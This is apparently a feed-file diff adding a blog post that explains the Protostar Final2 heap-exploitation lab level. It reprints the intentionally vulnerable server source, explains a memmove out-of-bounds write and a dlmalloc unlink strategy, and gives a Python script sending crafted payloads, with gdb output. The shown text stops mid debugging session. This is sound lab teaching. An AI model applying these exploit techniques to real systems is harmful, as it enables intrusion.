@@ -4,7 +4,7 @@
   <title><![CDATA[David Xia]]></title>
   <link href="https://www.davidxia.com/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-10-30T23:52:10-04:00</updated>
+  <updated>2020-11-01T18:14:59-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,1011 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[My Solution to Exploit Exercises Protostar Final2 Level]]></title>
+    <link href="https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level/"/>
+    <updated>2020-11-01T17:46:32-05:00</updated>
+    <id>https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level</id>
+    <content type="html"><![CDATA[<p>This is an explanation of <a href="https://exploit-exercises.lains.space/protostar/final2/">Protostar level Final2</a>. I wrote a solution in April without an
+explanation. I read it last night and had to spend half a day to understand it again. So next time
+I&rsquo;ll write the explanation while it&rsquo;s still fresh in my head.</p>
+
+<p>The level&rsquo;s description is</p>
+
+<blockquote><p>Remote heap level :)<br/>Core files will be in /tmp.<br/>This level is at /opt/protostar/bin/final2</p></blockquote>
+
+
+
+
+<!-- more -->
+
+
+<p>This is the source code.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
+</span><span class='line'><span class="cp">#include &quot;../common/malloc.c&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define NAME &quot;final2&quot;</span>
+</span><span class='line'><span class="cp">#define UID 0</span>
+</span><span class='line'><span class="cp">#define GID 0</span>
+</span><span class='line'><span class="cp">#define PORT 2993</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define REQSZ 128</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/*</span>
+</span><span class='line'><span class="cm">  * Work out old software bug</span>
+</span><span class='line'><span class="cm">  */</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;ROOT&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
+</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
+</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>
+</span><span class='line'>          <span class="s">&quot;yes&quot;</span> <span class="o">:</span> <span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>      <span class="n">destroylist</span><span class="p">[</span><span class="n">dll</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="cm">/* Line is missing in original source. gdb disassemble will show it. */</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">));</span>
+</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
+</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
+</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Overview of source code</h2>
+
+<p>The first line of the description coupled with the fact the code listens on port 2993 means we&rsquo;ll
+have to send a TCP packet that exploits a heap related vulnerability. <code>main()</code> is pretty simple. It
+runs the final2 binary in the background as root and processes requests with <code>get_requests()</code>.
+<code>get_requests()</code> declares an array of 256 char pointers and reads input strings into it. If any
+request size isn&rsquo;t <code>REQSZ</code> or 128 bytes, the function breaks out of the <code>while(1)</code> loop. Any request
+payload that doesn&rsquo;t start with <code>FSRD</code> also breaks out of the loop. The <code>check_path()</code> function is
+then called and <code>dll</code> is incremented. A for-loop writes &ldquo;Process OK&rdquo; to stdout and frees each string
+buffer starting with the oldest.</p>
+
+<p><code>check_path()</code> stores a pointer to <code>buf</code>&rsquo;s right-most <code>/</code> in <code>p</code>. <code>l</code> is the length of the string
+starting from <code>p</code>. If <code>p</code> is greater than 0, <code>start</code> points to the part of <code>buf</code> that has <code>"ROOT"</code>.
+If <code>"ROOT"</code> is a substring in <code>buf</code>, the while loop decrements <code>start</code> until it finds a <code>/</code>. Then
+<code>memmove()</code> moves <code>l</code> bytes of the string starting at <code>p</code> to <code>start</code>.</p>
+
+<p>A TCP packet with the string <code>FSRD/ROOT/AAAA</code> will cause <code>p</code> to point to the second <code>/</code>. So <code>p</code> as a
+string is <code>/AAAA</code>. <code>l</code> is 5. <code>start</code> initially points to the <code>R</code> in <code>ROOT</code> and later is decremented
+to point to the first <code>/</code>. <code>memmove()</code> changes the string to <code>FSRD/AAAA/AAAA</code>.</p>
+
+<p>Notice that <code>start--</code> doesn&rsquo;t check the bounds of the string passed in by <code>buf</code>. It will keep
+scanning leftward until it finds some <code>/</code>. So <code>memmove()</code> can write to memory outside of the current
+string.</p>
+
+<h2>General Exploit Strategy</h2>
+
+<p>We know we&rsquo;ll need to exploit the <code>free()</code> call which in this series of exercises uses the
+vulnerable dlmalloc <code>unlink()</code> macro. In a <a href="https://www.davidxia.com/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a>, I showed how this exploit
+manipulates heap memory to redirect code execution. We&rsquo;ll need to inject <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a> via the request
+payloads. Our request payloads also need to corrupt heap memory in a way that will trick dlmalloc
+into redirecting code to the shellcode.</p>
+
+<h2>Exploiting <code>memmove()</code></h2>
+
+<p>Let&rsquo;s craft a first payload that will allow the second payload to overwrite heap memory before the
+start of the second string. <code>FSRDAAAA...AAAA/AAAA</code> should work. The second payload can be
+<code>FSRDROOTAAA...AAAA/BBBB</code>. After the second call to <code>check_path()</code>, the heap memory of the first
+string should be <code>FSRDAAAA...AAAA/BBBB</code>. Let&rsquo;s confirm this with a Python script and <code>gdb</code>. We&rsquo;ll
+set a breakpoint right after the call to <code>check_path()</code> and send these two strings.</p>
+
+<p>We save the following contents to a file named <code>test.py</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2993</span>
+</span><span class='line'><span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Establish TCP connection</span>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload1</span> <span class="o">=</span> <span class="s">&#39;FSRD&#39;</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">REQSZ</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="s">&#39;AAAA&#39;</span>  <span class="c"># &#39;FSRDAAAA.../AAAA&#39;</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">payload1</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload2</span> <span class="o">=</span> <span class="s">&#39;FSRD&#39;</span> <span class="o">+</span> <span class="s">&#39;ROOT&#39;</span> <span class="o">+</span> <span class="s">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">REQSZ</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="s">&#39;BBBB&#39;</span>  <span class="c"># &#39;FSRDROOTAAAA.../BBBB&#39;</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">payload2</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Terminate session by sending a payload that causes get_requests() to return</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;AAAA&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;ascii&#39;</span><span class="p">))</span>  <span class="c"># print the confirmation</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I&rsquo;m running the Protostar VM on Virtualbox on a Macbook. Set the network settings for the VM to
+Host-only Adapter. Once the VM starts, use the Virtualbox &ldquo;Show&rdquo; button to get a terminal to the VM.
+Login as <code>user</code> with password <code>user</code>. Run <code>ip addr show</code> to find the VM&rsquo;s local IP address. Mine is
+<code>192.168.99.107</code>. I then close the Virtualbox terminal because I like to use iTerm. I SSH with iTerm
+into the VM as root with password <code>godmode</code>. We need to be root in order to attach gdb to a running
+process.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;UserKnownHostsFile=/dev/null&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;StrictHostKeyChecking=no&quot;</span> <span class="n">root</span><span class="nd">@192.168.99.107</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can see final2 is already running. We get the PID.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">/</span><span class="c"># ps aux | grep final2</span>
+</span><span class='line'><span class="n">root</span>      <span class="mi">1495</span>  <span class="mf">0.0</span>  <span class="mf">0.2</span>   <span class="mi">1544</span>   <span class="mi">284</span> <span class="err">?</span>        <span class="n">Ss</span>   <span class="mi">10</span><span class="p">:</span><span class="mi">44</span>   <span class="mi">0</span><span class="p">:</span><span class="mo">00</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">final2</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now attach gdb to it. Since the program forks a new child process to handle requests, we <code>set follow-fork-mode child</code> to make gdb follow the child process instead of the parent. <code>set detach-on-fork off</code> makes gdb hold control of both parent and child (I&rsquo;m not sure if this is necessary). The other two gdb settings are my personal preferences.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">/</span><span class="c"># gdb /opt/protostar/bin/final2 -p 1495</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">GDB</span><span class="p">)</span> <span class="mf">7.0</span><span class="o">.</span><span class="mi">1</span><span class="o">-</span><span class="n">debian</span>
+</span><span class='line'><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2009</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="o">.</span>
+</span><span class='line'><span class="n">License</span> <span class="n">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="ow">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl</span><span class="o">.</span><span class="n">html</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">This</span> <span class="ow">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="ow">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="o">.</span>
+</span><span class='line'><span class="n">There</span> <span class="ow">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="o">.</span>  <span class="n">Type</span> <span class="s">&quot;show copying&quot;</span>
+</span><span class='line'><span class="ow">and</span> <span class="s">&quot;show warranty&quot;</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
+</span><span class='line'><span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="k">as</span> <span class="s">&quot;i486-linux-gnu&quot;</span><span class="o">.</span>
+</span><span class='line'><span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="p">:</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">gnu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;...</span>
+</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">final2</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
+</span><span class='line'><span class="n">Attaching</span> <span class="n">to</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">final2</span><span class="p">,</span> <span class="n">process</span> <span class="mi">1495</span>
+</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mf">6.</span><span class="o">..</span><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.11</span><span class="o">.</span><span class="mf">2.</span><span class="n">so</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
+</span><span class='line'><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
+</span><span class='line'><span class="n">Loaded</span> <span class="n">symbols</span> <span class="k">for</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
+</span><span class='line'><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mf">2.</span><span class="o">..</span><span class="n">Reading</span> <span class="n">symbols</span> <span class="kn">from</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.11</span><span class="o">.</span><span class="mf">2.</span><span class="n">so</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
+</span><span class='line'><span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)</span><span class="o">...</span><span class="n">done</span><span class="o">.</span>
+</span><span class='line'><span class="n">Loaded</span> <span class="n">symbols</span> <span class="k">for</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
+</span><span class='line'><span class="n">accept</span> <span class="p">()</span> <span class="n">at</span> <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">sysv</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">i386</span><span class="o">/</span><span class="n">socket</span><span class="o">.</span><span class="n">S</span><span class="p">:</span><span class="mi">64</span>
+</span><span class='line'><span class="mi">64</span>    <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">sysv</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">i386</span><span class="o">/</span><span class="n">socket</span><span class="o">.</span><span class="n">S</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
+</span><span class='line'>  <span class="ow">in</span> <span class="o">../</span><span class="n">sysdeps</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">sysv</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">i386</span><span class="o">/</span><span class="n">socket</span><span class="o">.</span><span class="n">S</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">follow</span><span class="o">-</span><span class="n">fork</span><span class="o">-</span><span class="n">mode</span> <span class="n">child</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">detach</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">fork</span> <span class="n">off</span>
+</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
